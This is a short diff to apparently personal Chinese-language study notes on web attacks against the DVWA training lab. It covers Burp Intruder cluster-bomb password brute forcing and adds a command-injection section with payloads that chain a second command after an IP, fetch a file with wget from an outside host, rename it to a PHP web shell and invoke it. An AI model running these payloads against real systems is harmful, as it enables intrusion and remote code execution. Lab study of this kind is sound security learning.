@@ -8,3 +8,11 @@ Intruder->Positions的Attack type選Cluster bomb,在usernameusername,password在
 Intruder->Payloads->Payload Options添加字典檔或自定義,若帳號密碼都要破解的話Payload set1及set2都須設定字典檔
 Intruder右上角Start attack
 ---
+Command Injection
+---
+透過&&,&,|後接續第二句cmd
+其中&&跟&的差異為&&前一句語法須執行成功才會執行第二句語法
+127.0.0.1 & wget ip/eval.txt
+127.0.0.1 & cp eval.txt eval.php
+127.0.0.1/dvwa/vulnerablitites/exec/eval.php?cmd=phpinfo()
+---
